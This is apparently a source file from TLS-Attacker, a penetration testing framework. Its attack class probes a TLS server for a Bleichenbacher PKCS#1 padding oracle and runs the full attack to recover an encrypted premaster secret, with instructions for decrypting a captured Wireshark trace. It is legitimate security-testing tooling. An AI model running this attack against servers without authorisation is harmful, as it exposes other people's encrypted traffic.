/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
import de.rub.nds.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.AlertDescription;
import de.rub.nds.tlsattacker.core.constants.AlertLevel;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.util.LogLevel;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 messages to the TLS server and observes
 * the server responses. In case there are differences in the server responses,
 * it is very likely that it is possible to execute Bleichenbacher attacks.
 *

 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(BleichenbacherAttacker.class);

    public BleichenbacherAttacker(BleichenbacherCommandConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        if (config.getInvalidResponseContent() == null && config.getValidResponseContent() == null) {
            throw new ConfigurationException("You have to set a string contained in the last "
                    + "protocol message sent by the server which will indicate whether the PKCS#1 "
                    + "message was valid or not. For example, you can set the following parameter: "
                    + "-invalid_response BAD_RECORD_MAC");
        }
        RSAPublicKey publicKey;
        Config tlsConfig = config.createConfig();
        publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }
        LOGGER.info("Fetched the following server public key: " + publicKey);

        if (config.getEncryptedPremasterSecret() == null) {
            throw new ConfigurationException("You have to set the encrypted premaster secret you are "
                    + "going to decrypt");
        }

        byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
        if ((pms.length * 8) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException("The length of the encrypted premaster secret you have "
                    + "is not equal to the server public key length. Have you selected the correct value?");
        }

        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, tlsConfig,
                config.getValidResponseContent(), config.getInvalidResponseContent());

        Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
        attacker.attack();
        BigInteger solution = attacker.getSolution();

        LOGGER.info("Final solution: {}", solution.toString(16));

        byte[] pmsResult = solution.toByteArray();
        pmsResult = Arrays.copyOfRange(pmsResult, pmsResult.length - 46, pmsResult.length);
        String pmsResultString = ArrayConverter.bytesToHexString(pmsResult, false).replace(" ", "");

        LOGGER.info("If you have a TLS wireshark trace, you can decrypt it as follows. "
                + "Create a file with the following content and use it as an input into "
                + "wireshark:\n  CLIENT_RANDOM <client random> {}", pmsResultString);

    }

    private ProtocolMessage executeTlsFlow(byte[] encryptedPMS) {
        // we are initializing a new connection in every loop step, since most
        // of the known servers close the connection after an invalid handshake
        State state = new State(config.createConfig());
        state.getConfig().setWorkflowTraceType(WorkflowTraceType.HANDSHAKE);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig()
                .getWorkflowExecutorType(), state);
        WorkflowTrace trace = state.getWorkflowTrace();

        RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
        ModifiableByteArray epms = new ModifiableByteArray();
        epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
        cke.setPublicKey(epms);

        workflowExecutor.executeWorkflow();
        return WorkflowTraceUtil.getLastReceivedMessage(trace);
    }

    @Override
    public Boolean isVulnerable() {
        RSAPublicKey publicKey;
        Config tlsConfig = config.createConfig();
        publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info("Fetched the following server public key: " + publicKey);

        List<ProtocolMessage> protocolMessages = new LinkedList<>();
        byte[][] vectors = PKCS1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType());
        byte[][] plainVectors = PKCS1VectorGenerator.generatePlainPkcs1Vectors(publicKey, config.getType());
        for (byte[] vector : vectors) {
            ProtocolMessage pm = executeTlsFlow(vector);
            protocolMessages.add(pm);
        }

        LOGGER.info("The following list of protocol messages was found (the last protocol message in the client-server communication):");
        for (int i = 0; i < protocolMessages.size(); i++) {
            ProtocolMessage pm = protocolMessages.get(i);
            LOGGER.info("Tested vector: {}", ArrayConverter.bytesToHexString(plainVectors[i]));
            LOGGER.info("Last server TLS message: {}", pm.getProtocolMessageType());
            if (pm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
                AlertMessage alert = (AlertMessage) pm;
                AlertDescription ad = AlertDescription.getAlertDescription(alert.getDescription().getValue());
                AlertLevel al = AlertLevel.getAlertLevel(alert.getLevel().getValue());
                LOGGER.info("  Alert {}: {}", al, ad);
            }
        }
        HashSet<ProtocolMessage> protocolMessageSet = new HashSet<>(protocolMessages);
        StringBuilder sb = new StringBuilder("[");
        for (ProtocolMessage pm : protocolMessageSet) {
            sb.append(pm.toCompactString()).append(' ');
        }
        sb.append(']');
        if (protocolMessageSet.size() == 1) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, NOT vulnerable, one message found: {}", tlsConfig
                    .getConnectionEnd().getHostname(), sb.toString());
            return false;
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Vulnerable (probably), found: {}", tlsConfig.getConnectionEnd()
                    .getHostname(), sb.toString());
            return true;
        }
    }
}
